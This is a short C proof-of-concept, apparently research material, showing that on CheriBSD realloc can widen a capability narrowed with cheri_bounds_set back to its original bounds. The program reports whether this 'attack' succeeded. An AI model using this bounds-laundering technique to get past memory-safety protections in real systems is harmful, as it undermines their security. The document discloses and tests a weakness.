#include <assert.h>
#include <cheriintrin.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

#if !defined(__CHERI_PURE_CAPABILITY__)
#  error This example must be run on a CHERI purecap system
#endif

// On CheriBSD, if a capability's bounds include the base pointer to a
// `malloc`d block we can use `realloc` to launder a narrow capability into a
// wider one. In other words if:
//   1. malloc returns a capability C1 to a block 0..n bytes long
//   2. we create a capability C2 with bounds 0..m where m < n
//   3. realloc allows us to launder C2 back into C1

int main() {
    // malloc returns a capability C1 to a block 0..n bytes long
    uint8_t *arr = malloc(16);

    // Derive a capability C2 with bounds 0..m where m < n
    arr = cheri_bounds_set(arr, 8);
    assert(cheri_tag_get(arr) && cheri_length_get(arr) == 8);

    // realloc allows us to launder C2 back into C1
    arr = realloc(arr, 16);
    if (cheri_tag_get(arr) && cheri_length_get(arr) >= 16) {
	printf("Attack successful\n");
    } else {
        printf("Attack unsuccessful\n");
    }
    return 0;
}
